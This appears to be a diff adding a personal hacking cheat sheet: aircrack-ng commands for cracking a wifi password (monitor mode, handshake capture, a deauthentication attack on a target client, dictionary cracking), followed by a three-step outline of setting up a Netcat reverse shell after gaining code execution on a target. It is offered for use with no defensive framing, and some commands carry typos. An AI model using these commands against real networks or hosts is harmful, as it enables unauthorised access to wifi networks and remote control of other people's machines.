@@ -1,0 +1,13 @@
+#!!Aircrack-ng [Crack wifi password]
+[*]sudo airmon-ng start wlan0
+[*]sudo airodump-ng mon0
+[*]sudo airodump-ng -c[channel for wireless network 1 or 2 or..] --bssid [MAC address of accesspoint] -w[file name for handshake generally WPAcrack] wireless inferface[generally wlan0 or wlanmon] --ignore-negative-one
+[*]sudo aireplay-ng -deauth 100 -a [acces point MAC] -c [MAC of target client ] interface[wlan0 or wlanmon] --ignore negative one.
+[*] aircrack-ng -w [name of dict file] -b [MAc adddress of acces point] WPAcrack.cap
++For injection working test:
+[*]airplay-ng --test interface[monitor mde enable]
+------------------------------------------------------------------------------------------------------------------------------
+#!!Netcat reverse shell
+1.Set Up a Netcat listener on the attacking machine.
+2.Connect back to Netcat listener from target machine, after achieving remote code execution.
+3.Run commands on the target from the attacking machine through the Netcat shell session.
